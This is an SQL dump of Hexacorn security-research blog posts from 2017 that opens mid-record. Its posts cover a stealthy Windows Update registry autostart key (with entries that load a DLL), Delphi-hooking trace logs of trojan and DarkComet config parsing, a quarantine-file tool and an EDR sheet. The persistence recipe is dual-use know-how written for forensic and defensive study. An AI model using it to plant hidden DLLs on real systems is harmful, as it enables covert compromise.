ensure the lsm.exe continues to work… and a system starts with the ntsd.exe running in a background. Since the ntsd is launched in an insecure way, it is most likely a subject to a path companion attack (both via PATH and the ntsd.com). I have not tested the latter, cuz it’s 2:00am.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident Response,', 'http://www.hexacorn.com/blog/2017/04/02/beyond-good-ol-run-key-part-61/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (105, 'Permanent Link to More contained redirections coming to Registry near you…', 'Hexacorn', 'March 19, 2017 ', 'I recently came across an interesting bit inside the Registry of Windows 10.\nThe key:\n\nHKLM\\system\\currentcontrolset\\control\\hiveredirectionlist\n\nis looked at during the system boot by the smss.exe process and the latter attempts to read the following entries underneath:\n\n\\REGISTRY\\MACHINE\\HARDWARE\n\\REGISTRY\\MACHINE\\SECURITY\n\\REGISTRY\\MACHINE\\SOFTWARE\n\\REGISTRY\\MACHINE\\SYSTEM\n\\REGISTRY\\USER\\.DEFAULT\n\\REGISTRY\\MACHINE\\SAM\n\nGoogling around brought only one meaningful result talking about Container technology inside Windows 10 and Windows Server 2016. These entries will be used to deliver the redirection functionality intended to support a full isolation of the container.\nSo… now we will have Container Registry redirection, on top of a WOW Registry Redirection and WOW Registry Reflection, on top of a temporary Registry overriding, on top of INI to Registry mapping.\nShare this :)', 'Forensic Analysis, Windows Registry', 'http://www.hexacorn.com/blog/2017/03/19/more-contained-redirections-coming-to-registry-near-you/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (106, 'Permanent Link to Beyond good ol’ Run key, Part 60', 'Hexacorn', 'March 18, 2017 ', 'Today I’ll describe a little secret – a stealthy autostart key that is not very well-known and is very reliable since it is used by… well… the Windows Update.\nYup, it’s a pretty handy one…\nThis is the key:\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Setup\\ServiceStartup\n\nIt has two interesting properties:\n\nIt can be used as a persistence mechanism\nIt can also mysteriously make files re-appear on the system as the mechanism is used to update files and as such, the entries are being used to copy files during the system start (by the ‘svchost.exe -k netsvcs’ process)\n\nThis is an example entry:\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Setup\\ServiceStartup\\malware.dll\r\n\"RegistrationFlags\"=dword:00000001\r\n\"CacheFile\"=\"C:\\\\test\\\\malware.dll\"\r\n\"TargetFile\"=\"C:\\\\WINDOWS\\\\system32\\\\malware.dll\"\nThe entry will force the file:\n\n\nC:\\test\\malware.dll\n\n\nto be loaded.\n\nIt will be also copied to:\n\n\nC:\\WINDOWS\\system32\\malware.dll\n\n\n\nNote that you can also simply ignore the copying and drop the file anywhere, and just point ‘CacheFile’ and ‘TargetFile’ to it.\nIf you look at the first screenshot you will notice the Procmon logs show a reference to the ’20MUIFixUp’ entry.\nInterestingly, this entry can be used to just copy files, so adding a reg combo as below:\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Setup\\ServiceStartup\\malware.dll\r\n\"20MUIFixUp\"=dword:00000001\r\n\"CacheFile\"=\"C:\\\\test\\\\malware.dll\"\r\n\"TargetFile\"=\"C:\\\\WINDOWS\\\\system32\\\\malware.dll\"\nwill create ‘C:\\WINDOWS\\system32\\malware.dll’ anytime you boot the system (but the file won’t be loaded/executed). The’ 20MUIFixUp’ entry in the Registry will be deleted afterwards (so it needs to be re-created).\nInterestingly, the information about the loaded DLLs can be found inside the Windows Update log file:\n\nc:\\WINDOWS\\WindowsUpdate.log\n\nHere’s an excerpt:\nMisc    Registering binary: C:\\WINDOWS\\system32\\regsvr32.exe  /s \"C:\\WINDOWS\\system32\\malware.dll\"\r\nMisc    FATAL: Self registration of C:\\WINDOWS\\system32\\malware.dll failed, error = 0x8024D007\r\nSetup    FATAL: Failed to register C:\\WINDOWS\\system32\\malware.dll: error 0x8024d007\r\nSetup    FATAL: ProcessDelayedCopies failed: 0x8024d007\r\nService    FATAL: Failed to fix up registration at service startup: 0x8024d007\nMy test DLL was not prepared correctly (missing exported ‘DllInstall’ – see below), but the DLL still loads.\nAt least on Windows XP.\n\nOkay, what about newer versions of Windows?\nFirst, let’s fix my DLL.\nTo do so, I actually add two exported functions:\n\nDllInstall, and\nDllRegisterServer.\n\nWhy?\nBecause the ‘RegistrationFlags’ parameter can be equal either to ‘1’ or ‘2’.\nIf it is 1, the ‘DllInstall’ API will be called. Otherwise, it will be the ‘DllRegisterServer’ API.\nWhen these DLLs are loaded and respective functions are called the Windows Update service logs the appropriate information to the ‘WindowsUpdate.log’ file – let’s have a look at the two examples:\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Setup\\ServiceStartup\\malware.dll\r\n\"RegistrationFlags\"=dword:00000001\r\n\"CacheFile\"=\"C:\\\\test\\\\malware.dll\"\r\n\"TargetFile\"=\"C:\\\\test\\\\malware.dll\"\nand\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Setup\\ServiceStartup\\malware.dll\r\n\"RegistrationFlags\"=dword:00000002\r\n\"CacheFile\"=\"C:\\\\test\\\\malware.dll\"\r\n\"TargetFile\"=\"C:\\\\test\\\\malware.dll\"\nWhen Windows Update service is restarted, you will get the following log entries inside the WindowsUpdate.log:\n\"RegistrationFlags\"=dword:00000001\r\nMisc    Registering binary: C:\\Windows\\system32\\regsvr32.exe  /s \"C:\\test\\malware.dll\"\r\nAgent      * WU client version 7.6.7600.256\r\nAgent      * Base directory: C:\\Windows\\SoftwareDistribution\r\nAgent      * Access type: No proxy\r\nAgent      * Network state: Connected\r\n\r\n\"RegistrationFlags\"=dword:00000002\r\nMisc    Registering binary: C:\\Windows\\system32\\regsvr32.exe  /s /n /i \"c:\\test\\malware.dll\"\r\nAgent      * WU client version 7.6.7600.256\r\nAgent      * Base directory: C:\\Windows\\SoftwareDistribution\r\nAgent      * Access type: No proxy\r\nAgent      * Network state: Connected\r\n\nThe trick works like a charm for Windows 7. I don’t see it working on Windows 10 though, but perhaps it has to be triggered some other way.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident Response,', 'http://www.hexacorn.com/blog/2017/03/18/beyond-good-ol-run-key-part-60/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (107, 'Permanent Link to Enter Sandbox – part 14: Reading the old Delphi Scrolls…', 'Hexacorn', 'March 16, 2017 ', 'Sandboxing regular PE (not .NET) files is easy and tricky at the same time. API monitoring is trivial. What is not is not is this:\n\nThe crazy number of API functions (Native, Win32)\nFunction calls that are a bit harder to monitor, because the functionality is delivered via a complex maze of virtual tables f.ex. COM\nMonitoring of functions or methods that are placed on a higher level of abstraction f.ex. scripts (AutoIT, VBS, VBA), as well as installers (f.ex. NullSoft)\nThe variety of library functions that are included inside the executables (statically)\n\nThe last item on the list requires a bit more attention.\nHooking API, or intercepting their calls any other way is relatively easy as long as you know where they are (and perhaps can handle the stolen bytes well since some malware is using this trick). With code embedded directly inside the executable there is no import table, no list of pointers of any kind, no virtual tables, no RTTI, nothing. Of course, using tools like IDA, or a good disassembly library, or perhaps instrumented execution it may be possible to determine the exact location of these functions, but it’s a pretty complex and time consuming task, especially for commercial sandboxes that must run FAST.\nOn top of that, there is another issue. The code is not located at a fixed address, but can be placed all over the place. No, I am not talking about ASLR. I am talking about wrappers that use RunPE to run executables from memory. If you intercept Windows API calls, running programs via RunPE doesn’t make a difference – the APIs will eventually be executing from a known location inside the system libraries in memory. With relocated code the statically linked functions need to be found _every_ time the executable is loaded, mapped to a different processes, or simply relocated (direct code inject, process hollowing, some unpackers, etc.). Yes, for the malware that spawns a number of child processes and plays with RunPE a number of times during the session it will significantly slow down the tagging of functions in memory.\nSo… after a bit of scaremongering let’s have a look at a very good example.\nThe enfant terrible of programs that are truly annoying for analysis are Delphi executables (and all the other brands of Delphish executables f.es. Embarcadero). They rely heavily on the custom Delphi libraries and as such are hard to understand no matter whether they are debugged, or disassembled. Of course, there exist good decompilers that can help a lot, and flirt signatures for Delphi executables do a lot of magic during static program analysis as well. However, I am not aware of any of the available sandboxes or monitors doing dynamic analysis of Delphi code during the run-time.\nI remember the moment when I tested the first Delphi function hooking that I implemented a few years ago. My mind was blown. The sudden insight into the program business logic that the hooking gave me was incredible… !!!\nI hope this functionality will be implemented in commercial sandboxes soon. There is a tremendous amount of metadata just waiting to be discovered…\nLet’s have a look at a couple of examples – the one below shows a progressive parsing of the config for a trojan:\nLStrPos |, <someip>|1337|IPKServer|IPKMutex|encpassword|-1|AdobeART.exe|AdobeART|-1|\r\nLStrPos |, <someip>|1337|IPKServer|IPKMutex|encpassword|-1|AdobeART.exe|AdobeART|-1|\r\nLStrPos |, <someip>|1337|IPKServer|IPKMutex|encpassword|-1|AdobeART.exe|AdobeART|-1|\r\nLStrPos |, 1337|IPKServer|IPKMutex|encpassword|-1|AdobeART.exe|AdobeART|-1|\r\nLStrPos |, 1337|IPKServer|IPKMutex|encpassword|-1|AdobeART.exe|AdobeART|-1|\r\nLStrPos |, 1337|IPKServer|IPKMutex|encpassword|-1|AdobeART.exe|AdobeART|-1|\r\nLStrPos |, IPKServer|IPKMutex|encpassword|-1|AdobeART.exe|AdobeART|-1|\r\nLStrPos |, IPKServer|IPKMutex|encpassword|-1|AdobeART.exe|AdobeART|-1|\r\nLStrPos |, IPKServer|IPKMutex|encpassword|-1|AdobeART.exe|AdobeART|-1|\r\nLStrPos |, IPKMutex|encpassword|-1|AdobeART.exe|AdobeART|-1|\r\nLStrPos |, IPKMutex|encpassword|-1|AdobeART.exe|AdobeART|-1|\r\nLStrPos |, IPKMutex|encpassword|-1|AdobeART.exe|AdobeART|-1|\r\nLStrPos |, encpassword|-1|AdobeART.exe|AdobeART|-1|\r\nLStrPos |, encpassword|-1|AdobeART.exe|AdobeART|-1|\r\nLStrPos |, encpassword|-1|AdobeART.exe|AdobeART|-1|\r\nLStrPos |, -1|AdobeART.exe|AdobeART|-1|\r\nLStrPos |, -1|AdobeART.exe|AdobeART|-1|\r\nLStrPos |, -1|AdobeART.exe|AdobeART|-1|\r\nLStrPos |, AdobeART.exe|AdobeART|-1|\r\nLStrPos |, AdobeART.exe|AdobeART|-1|\r\nLStrPos |, AdobeART.exe|AdobeART|-1|\r\nLStrPos |, AdobeART|-1|\r\nLStrPos |, AdobeART|-1|\r\nLStrPos |, AdobeART|-1|\r\nLStrPos |, -1|\r\nLStrPos |, -1|\r\nLStrPos |, -1|\r\nLStrPos |,\r\n\nThis example shows a comparison of characters and the string ‘apocalypse’ can be read from a series of string comparisons:\nLStrCmp2 (substring=a, string=|)\r\nLStrCmp2 (substring=p, string=|)\r\nLStrCmp2 (substring=o, string=|)\r\nLStrCmp2 (substring=c, string=|)\r\nLStrCmp2 (substring=a, string=|)\r\nLStrCmp2 (substring=l, string=|)\r\nLStrCmp2 (substring=y, string=|)\r\nLStrCmp2 (substring=p, string=|)\r\nLStrCmp2 (substring=s, string=|)\r\nLStrCmp2 (substring=e, string=|)\nAnother example almost instantly tells me that the program requires a command line parameter:\nWStrCmp (substring=, string=/debug)\r\n\nWhat about Delphi-based Anti-routines? This is a whole new unexplored of area !!!\nLStrPos (substring=SNIFFER, string=EXPLORER.EXE)\r\n\r\nLStrPos (substring=WINDUMP, string=EXPLORER.EXE)\r\n\r\nLStrPos (substring=NETPRYER, string=EXPLORER.EXE)\nAnd last example – DarkComet config processing:\nLStrCmp (substring=, string=GENCODE)\r\nLStrCmp (substring=MUTEX, string=GENCODE)\r\nLStrCmp (substring=SID, string=GENCODE)\r\nLStrCmp (substring=FWB, string=GENCODE)\r\nLStrCmp (substring=NETDATA, string=GENCODE)\r\nLStrCmp (substring=GENCODE, string=GENCODE)\r\nLStrCmp (substring=\\, string=\\)\r\nLStrCmp (substring=, string=NETDATA)\r\nLStrCmp (substring=MUTEX, string=NETDATA)\r\nLStrCmp (substring=SID, string=NETDATA)\r\nLStrCmp (substring=FWB, string=NETDATA)\r\nLStrCmp (substring=NETDATA, string=NETDATA)\r\nLStrCmp (substring=, string=SID)\r\nLStrCmp (substring=MUTEX, string=SID)\r\nLStrCmp (substring=SID, string=SID)\r\nLStrCmp (substring=, string=MUTEX)\r\nLStrCmp (substring=MUTEX, string=MUTEX)\r\nLStrCmp (substring=, string=EDTPATH)\r\nLStrCmp (substring=MUTEX, string=EDTPATH)\r\nLStrCmp (substring=SID, string=EDTPATH)\r\nLStrCmp (substring=FWB, string=EDTPATH)\r\nLStrCmp (substring=NETDATA, string=EDTPATH)\r\nLStrCmp (substring=GENCODE, string=EDTPATH)\r\nLStrCmp (substring=OFFLINEK, string=EDTPATH)\r\nLStrCmp (substring=, string=EDTPATH)\r\nLStrCmp (substring=, string=COMBOPATH)\r\nLStrCmp (substring=MUTEX, string=COMBOPATH)\r\nLStrCmp (substring=SID, string=COMBOPATH)\r\nLStrCmp (substring=FWB, string=COMBOPATH)\r\nLStrCmp (substring=NETDATA, string=COMBOPATH)\r\nLStrCmp (substring=GENCODE, string=COMBOPATH)\r\nLStrCmp (substring=OFFLINEK, string=COMBOPATH)\r\nLStrCmp (substring=, string=COMBOPATH)\r\nLStrCmp (substring=, string=11)\r\nLStrCmp (substring=, string=-1)\r\nLStrCmp (substring=, string=0)\r\nLStrCmp (substring=, string=1)\r\nLStrCmp (substring=, string=2)\r\nLStrCmp (substring=, string=3)\r\nLStrCmp (substring=, string=4)\r\nLStrCmp (substring=, string=5)\r\nLStrCmp (substring=, string=6)\r\nLStrCmp (substring=, string=7)\r\nLStrCmp (substring=, string=8)\r\nLStrCmp (substring=, string=9)\r\nLStrCmp (substring=, string=10)\r\nLStrCmp (substring=, string=GENCODE)\r\nLStrCmp (substring=MUTEX, string=GENCODE)\r\nLStrCmp (substring=SID, string=GENCODE)\r\nLStrCmp (substring=FWB, string=GENCODE)\r\nLStrCmp (substring=NETDATA, string=GENCODE)\r\nLStrCmp (substring=GENCODE, string=GENCODE)\r\nLStrCmp (substring=00df86ce377d71e66cb2451c446fede8, string=)\r\nLStrCmp (substring=, string=INSTALL)\r\nLStrCmp (substring=MUTEX, string=INSTALL)\r\nLStrCmp (substring=SID, string=INSTALL)\r\nLStrCmp (substring=FWB, string=INSTALL)\r\nLStrCmp (substring=NETDATA, string=INSTALL)\r\nLStrCmp (substring=GENCODE, string=INSTALL)\r\nLStrCmp (substring=OFFLINEK, string=INSTALL)\r\nLStrCmp (substring=, string=INSTALL)\r\nLStrCmp (substring=, string=1)\r\nLStrCmp (substring=, string=FAKEMSG)\r\nLStrCmp (substring=MUTEX, string=FAKEMSG)\r\nLStrCmp (substring=SID, string=FAKEMSG)\r\nLStrCmp (substring=FWB, string=FAKEMSG)\r\nLStrCmp (substring=NETDATA, string=FAKEMSG)\r\nLStrCmp (substring=GENCODE, string=FAKEMSG)\r\nLStrCmp (substring=OFFLINEK, string=FAKEMSG)\r\nLStrCmp (substring=, string=FAKEMSG)\r\nLStrCmp (substring=, string=1)\r\nLStrCmp (substring=, string=PDNS)\r\nLStrCmp (substring=MUTEX, string=PDNS)\r\nLStrCmp (substring=SID, string=PDNS)\r\nLStrCmp (substring=FWB, string=PDNS)\r\nLStrCmp (substring=NETDATA, string=PDNS)\r\nLStrCmp (substring=GENCODE, string=PDNS)\r\nLStrCmp (substring=OFFLINEK, string=PDNS)\r\nLStrCmp (substring=, string=PDNS)\r\nLStrCmp (substring=, string=FILEATTRIB)\r\nLStrCmp (substring=MUTEX, string=FILEATTRIB)\r\nLStrCmp (substring=SID, string=FILEATTRIB)\r\nLStrCmp (substring=FWB, string=FILEATTRIB)\r\nLStrCmp (substring=NETDATA, string=FILEATTRIB)\r\nLStrCmp (substring=GENCODE, string=FILEATTRIB)\r\nLStrCmp (substring=OFFLINEK, string=FILEATTRIB)\r\nLStrCmp (substring=, string=FILEATTRIB)\r\nLStrCmp (substring=, string=DIRATTRIB)\r\nLStrCmp (substring=MUTEX, string=DIRATTRIB)\r\nLStrCmp (substring=SID, string=DIRATTRIB)\r\nLStrCmp (substring=FWB, string=DIRATTRIB)\r\nLStrCmp (substring=NETDATA, string=DIRATTRIB)\r\nLStrCmp (substring=GENCODE, string=DIRATTRIB)\r\nLStrCmp (substring=OFFLINEK, string=DIRATTRIB)\r\nLStrCmp (substring=, string=DIRATTRIB)\r\nLStrCmp (substring=, string=CHIDEF)\r\nLStrCmp (substring=MUTEX, string=CHIDEF)\r\nLStrCmp (substring=SID, string=CHIDEF)\r\nLStrCmp (substring=FWB, string=CHIDEF)\r\nLStrCmp (substring=NETDATA, string=CHIDEF)\r\nLStrCmp (substring=GENCODE, string=CHIDEF)\r\nLStrCmp (substring=OFFLINEK, string=CHIDEF)\r\nLStrCmp (substring=, string=CHIDEF)\r\nLStrCmp (substring=, string=1)\r\nLStrCmp (substring=, string=CHIDED)\r\nLStrCmp (substring=MUTEX, string=CHIDED)\r\nLStrCmp (substring=SID, string=CHIDED)\r\nLStrCmp (substring=FWB, string=CHIDED)\r\nLStrCmp (substring=NETDATA, string=CHIDED)\r\nLStrCmp (substring=GENCODE, string=CHIDED)\r\nLStrCmp (substring=OFFLINEK, string=CHIDED)\r\nLStrCmp (substring=, string=CHIDED)\r\nLStrCmp (substring=, string=1)\r\nLStrCmp (substring=, string=BIND)\r\nLStrCmp (substring=MUTEX, string=BIND)\r\nLStrCmp (substring=SID, string=BIND)\r\nLStrCmp (substring=FWB, string=BIND)\r\nLStrCmp (substring=NETDATA, string=BIND)\r\nLStrCmp (substring=GENCODE, string=BIND)\r\nLStrCmp (substring=OFFLINEK, string=BIND)\r\nLStrCmp (substring=, string=BIND)\r\nLStrCmp (substring=, string=1)\r\nLStrCmp (substring=, string=PLUGS)\r\nLStrCmp (substring=MUTEX, string=PLUGS)\r\nLStrCmp (substring=SID, string=PLUGS)\r\nLStrCmp (substring=FWB, string=PLUGS)\r\nLStrCmp (substring=NETDATA, string=PLUGS)\r\nLStrCmp (substring=GENCODE, string=PLUGS)\r\nLStrCmp (substring=OFFLINEK, string=PLUGS)\r\nLStrCmp (substring=, string=PLUGS)\r\nLStrCmp (substring=, string=1)\r\nLStrCmp (substring=, string=PERSINST)\r\nLStrCmp (substring=MUTEX, string=PERSINST)\r\nLStrCmp (substring=SID, string=PERSINST)\r\nLStrCmp (substring=FWB, string=PERSINST)\r\nLStrCmp (substring=NETDATA, string=PERSINST)\r\nLStrCmp (substring=GENCODE, string=PERSINST)\r\nLStrCmp (substring=OFFLINEK, string=PERSINST)\r\nLStrCmp (substring=, string=PERSINST)\r\nLStrCmp (substring=, string=1)\r\nLStrCmp (substring=, string=SH1)\r\nLStrCmp (substring=MUTEX, string=SH1)\r\nLStrCmp (substring=SID, string=SH1)\r\nLStrCmp (substring=FWB, string=SH1)\r\nLStrCmp (substring=NETDATA, string=SH1)\r\nLStrCmp (substring=GENCODE, string=SH1)\r\nLStrCmp (substring=OFFLINEK, string=SH1)\r\nLStrCmp (substring=, string=SH1)\r\nLStrCmp (substring=, string=1)\r\nLStrCmp (substring=, string=SH3)\r\nLStrCmp (substring=MUTEX, string=SH3)\r\nLStrCmp (substring=SID, string=SH3)\r\nLStrCmp (substring=FWB, string=SH3)\r\nLStrCmp (substring=NETDATA, string=SH3)\r\nLStrCmp (substring=GENCODE, string=SH3)\r\nLStrCmp (substring=OFFLINEK, string=SH3)\r\nLStrCmp (substring=, string=SH3)\r\nLStrCmp (substring=, string=1)\r\nLStrCmp (substring=, string=SH4)\r\nLStrCmp (substring=MUTEX, string=SH4)\r\nLStrCmp (substring=SID, string=SH4)\r\nLStrCmp (substring=FWB, string=SH4)\r\nLStrCmp (substring=NETDATA, string=SH4)\r\nLStrCmp (substring=GENCODE, string=SH4)\r\nLStrCmp (substring=OFFLINEK, string=SH4)\r\nLStrCmp (substring=, string=SH4)\r\nLStrCmp (substring=, string=1)\r\nLStrCmp (substring=, string=SH5)\r\nLStrCmp (substring=MUTEX, string=SH5)\r\nLStrCmp (substring=SID, string=SH5)\r\nLStrCmp (substring=FWB, string=SH5)\r\nLStrCmp (substring=NETDATA, string=SH5)\r\nLStrCmp (substring=GENCODE, string=SH5)\r\nLStrCmp (substring=OFFLINEK, string=SH5)\r\nLStrCmp (substring=, string=SH5)\r\nLStrCmp (substring=, string=1)\r\nLStrCmp (substring=, string=SH6)\r\nLStrCmp (substring=MUTEX, string=SH6)\r\nLStrCmp (substring=SID, string=SH6)\r\nLStrCmp (substring=FWB, string=SH6)\r\nLStrCmp (substring=NETDATA, string=SH6)\r\nLStrCmp (substring=GENCODE, string=SH6)\r\nLStrCmp (substring=OFFLINEK, string=SH6)\r\nLStrCmp (substring=, string=SH6)\r\nLStrCmp (substring=, string=1)\r\nLStrCmp (substring=, string=SH7)\r\nLStrCmp (substring=MUTEX, string=SH7)\r\nLStrCmp (substring=SID, string=SH7)\r\nLStrCmp (substring=FWB, string=SH7)\r\nLStrCmp (substring=NETDATA, string=SH7)\r\nLStrCmp (substring=GENCODE, string=SH7)\r\nLStrCmp (substring=OFFLINEK, string=SH7)\r\nLStrCmp (substring=, string=SH7)\r\nLStrCmp (substring=, string=1)\r\nLStrCmp (substring=, string=SH8)\r\nLStrCmp (substring=MUTEX, string=SH8)\r\nLStrCmp (substring=SID, string=SH8)\r\nLStrCmp (substring=FWB, string=SH8)\r\nLStrCmp (substring=NETDATA, string=SH8)\r\nLStrCmp (substring=GENCODE, string=SH8)\r\nLStrCmp (substring=OFFLINEK, string=SH8)\r\nLStrCmp (substring=, string=SH8)\r\nLStrCmp (substring=, string=1)\r\nLStrCmp (substring=, string=SH9)\r\nLStrCmp (substring=MUTEX, string=SH9)\r\nLStrCmp (substring=SID, string=SH9)\r\nLStrCmp (substring=FWB, string=SH9)\r\nLStrCmp (substring=NETDATA, string=SH9)\r\nLStrCmp (substring=GENCODE, string=SH9)\r\nLStrCmp (substring=OFFLINEK, string=SH9)\r\nLStrCmp (substring=, string=SH9)\r\nLStrCmp (substring=, string=1)\r\nLStrCmp (substring=, string=SH10)\r\nLStrCmp (substring=MUTEX, string=SH10)\r\nLStrCmp (substring=SID, string=SH10)\r\nLStrCmp (substring=FWB, string=SH10)\r\nLStrCmp (substring=NETDATA, string=SH10)\r\nLStrCmp (substring=GENCODE, string=SH10)\r\nLStrCmp (substring=OFFLINEK, string=SH10)\r\nLStrCmp (substring=, string=SH10)\r\nLStrCmp (substring=, string=1)\r\nLStrCmp (substring=, string=MULTIBIND)\r\nLStrCmp (substring=MUTEX, string=MULTIBIND)\r\nLStrCmp (substring=SID, string=MULTIBIND)\r\nLStrCmp (substring=FWB, string=MULTIBIND)\r\nLStrCmp (substring=NETDATA, string=MULTIBIND)\r\nLStrCmp (substring=GENCODE, string=MULTIBIND)\r\nLStrCmp (substring=OFFLINEK, string=MULTIBIND)\r\nLStrCmp (substring=, string=MULTIBIND)\r\nLStrCmp (substring=, string=1)\r\nLStrCmp (substring=, string=MULTIPLUGS)\r\nLStrCmp (substring=MUTEX, string=MULTIPLUGS)\r\nLStrCmp (substring=SID, string=MULTIPLUGS)\r\nLStrCmp (substring=FWB, string=MULTIPLUGS)\r\nLStrCmp (substring=NETDATA, string=MULTIPLUGS)\r\nLStrCmp (substring=GENCODE, string=MULTIPLUGS)\r\nLStrCmp (substring=OFFLINEK, string=MULTIPLUGS)\r\nLStrCmp (substring=, string=MULTIPLUGS)\r\nLStrCmp (substring=, string=1)\r\nLStrCmp (substring=, string=FWB)\r\nLStrCmp (substring=MUTEX, string=FWB)\r\nLStrCmp (substring=SID, string=FWB)\r\nLStrCmp (substring=FWB, string=FWB)\r\nLStrCmp (substring=0, string=1)\r\nLStrCmp (substring=, string=GENCODE)\r\nLStrCmp (substring=MUTEX, string=GENCODE)\r\nLStrCmp (substring=SID, string=GENCODE)\r\nLStrCmp (substring=FWB, string=GENCODE)\r\nLStrCmp (substring=NETDATA, string=GENCODE)\r\nLStrCmp (substring=GENCODE, string=GENCODE)\r\nLStrCmp (substring=, string=PERS)\r\nLStrCmp (substring=MUTEX, string=PERS)\r\nLStrCmp (substring=SID, string=PERS)\r\nLStrCmp (substring=FWB, string=PERS)\r\nLStrCmp (substring=NETDATA, string=PERS)\r\nLStrCmp (substring=GENCODE, string=PERS)\r\nLStrCmp (substring=OFFLINEK, string=PERS)\r\nLStrCmp (substring=, string=PERS)\r\nLStrCmp (substring=, string=1)\r\nLStrCmp (substring=, string=PWD)\r\nLStrCmp (substring=MUTEX, string=PWD)\r\nLStrCmp (substring=SID, string=PWD)\r\nLStrCmp (substring=FWB, string=PWD)\r\nLStrCmp (substring=NETDATA, string=PWD)\r\nLStrCmp (substring=GENCODE, string=PWD)\r\nLStrCmp (substring=OFFLINEK, string=PWD)\r\nLStrCmp (substring=, string=PWD)\r\nLStrCmp (substring=, string=OFFLINEK)\r\nLStrCmp (substring=MUTEX, string=OFFLINEK)\r\nLStrCmp (substring=SID, string=OFFLINEK)\r\nLStrCmp (substring=FWB, string=OFFLINEK)\r\nLStrCmp (substring=NETDATA, string=OFFLINEK)\r\nLStrCmp (substring=GENCODE, string=OFFLINEK)\r\nLStrCmp (substring=OFFLINEK, string=OFFLINEK)\r\nLStrCmp (substring=1, string=1)\r\nLStrCmp (substring=Unknow, string=Unknow)\nShare this :)', 'Batch Analysis, Clustering, File Formats ZOO, Reversing, Sandboxing', 'http://www.hexacorn.com/blog/2017/03/16/enter-sandbox-part-14-reading-the-old-delphi-scrolls/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (108, 'Permanent Link to DeXRAY 2.0 released', 'Hexacorn', 'March 9, 2017 ', 'Recently I was contacted by two fellow DFIRers (thx @JamesHabben and @bmmaloney97) who suggested some improvements to the tool.\nJames mentioned to me a type of Quarantine files that I never heard of (Lumension LEMSS) and was kind enough to provide the recipe on how to handle them which I implemented in the tool (hope it works!).\nBrian wrote some piece of code to integrate it with DeXRAY. Thanks to his efforts McAfee BUP files are now finally properly handled (the older version of DeXRAY required the user to carve out the decrypted malware, because DeXRAY didn’t handle OLE files). Thx!\nIn the effort to better parse some troublesome files I have added an additional routine to carve the files out (and I use it for Symantec ccSubSdk files).\nLo and behold the DeXRAY is now 2.0.\nYou can download it here.\nThe full list of supported or recognized file formats is listed below:\n\nAhnLab (V3B)\nASquared (EQF)\nAvast (Magic@0=’-chest- ‘)\nAvira (QUA)\nBaidu (QV)\nBitDefender (BDQ)\nCMC Antivirus (CMC)\nComodo <GUID> (not really; Quarantined files are not encrypted \nESafe (VIR)\nESET (NQF)\nF-Prot (TMP) (Magic@0=’KSS’)\nKaspersky (KLQ)\nLavasoft AdAware (BDQ) /BitDefender files really/\nLumension LEMSS (lqf)\nMalwareBytes Data files (DATA)\nMalwareBytes Quarantine files (QUAR)\nMcAfee Quarantine files (BUP) /full support for OLE format/\nMicrosoft Forefront|Defender (Magic@0=0B AD|D3 45) – D3 45 C5 99 header handled\nPanda <GUID> Zip files\nSpybot – Search & Destroy 2 ‘recovery’\nSUPERAntiSpyware (SDB)\nSymantec ccSubSdk files: {GUID} files and submissions.idx\nSymantec Quarantine Data files (QBD)\nSymantec Quarantine files (VBN)\nSymantec Quarantine Index files (QBI)\nTrendMicro (Magic@0=A9 AC BD A7 which is a ‘VSBX’ string ^ 0xFF)\nQuickHeal <hash> files\nVipre (<GUID>_ENC2)\nAny binary file (using X-RAY scanning)\n\nShare this :)', 'Batch Analysis, Compromise Detection, DeXRAY, File Formats ZOO, Forensic Analysis, Incident Response', 'http://www.hexacorn.com/blog/2017/03/09/dexray-2-0-released/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (109, 'Permanent Link to Updated EDR Sheet', 'Hexacorn', 'March 9, 2017 ', 'After a few months of sitting on updates and fixes from various people I have finally updated the EDR sheet!\nI sincerely apologize for it taking so long, but life happens and that’s the only excuse I have \nThe updates fix a number of bugs spotted by readers, I also received a new information about one more product, update on acquisition, and minor tweaks here and there. A BIG thank you to everyone who contributed!!!\nIf you need any explanation on the meaning of the columns, please read this post.\nThe updated sheet can be downloaded here.\nIf you spot any mistake or feel there is something missing, please do not hesitate to contact me.\nShare this :)', 'EDR', 'http://www.hexacorn.com/blog/2017/03/09/updated-edr-sheet-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (110, 'Permanent Link to Introducing alternative strings and a tool of true tools', 'Hexacorn', 'February 17, 2017 ', 'Business is a world of words. Politics is a world of nuances.  The very same principle applies to data analysis – strings are readable, and alternative strings are readable alternatively. Given the fact the alternative strings have never been paid attention to, I introduce a new script that aims at fixing this issue.\nThe alt-strings.pl script is written in perl and is very simple to use. All you need to do is to run it using the following syntax:\n\n\nperl alt-strings.pl <filename>\n\n\nThe resulting output is very easy to interpret – here are two examples:\n\nRunning the script using its own code as an input shows a number of neglected blank characters:\n\n\n \n\nRunning the script on calc.exe – note the ‘frozen’ color of the window which indicates the next-gen AI algorithm is broadcasting the bells and other weird characters to the user making the analysis great again\n\n\nShare this :)', 'Silly', 'http://www.hexacorn.com/blog/2017/02/17/introducing-alternative-strings-and-a-tool-of-true-tools/\n');
